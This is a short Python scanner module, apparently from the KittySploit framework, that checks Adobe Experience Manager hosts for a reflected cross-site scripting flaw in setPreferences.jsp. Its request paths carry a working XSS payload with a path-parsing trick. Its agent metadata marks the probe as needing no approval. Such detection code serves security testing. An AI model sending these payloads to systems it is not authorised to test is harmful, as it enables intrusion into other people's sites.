#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe Experience Manager contains a cross-site scripting vulnerability via setPreferences."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe Experience Manager - Cross-Site Scripting Detection',
        'description': 'Adobe Experience Manager contains a cross-site scripting vulnerability via setPreferences.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfiguration', 'aem', 'xss', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.youtube.com/watch?v=VwLSUHNhrOw&t=142s',
            'https://twitter.com/zin_min_phyo/status/1465394815042916352',
        ],
    }

    def run(self):
        for path in ('/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a', '/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 400:
                continue
            body = r.text or ""
            body_all = ('<svg/onload=confirm(document.domain);>', 'A JSONObject text must begin with',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Adobe Experience Manager - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

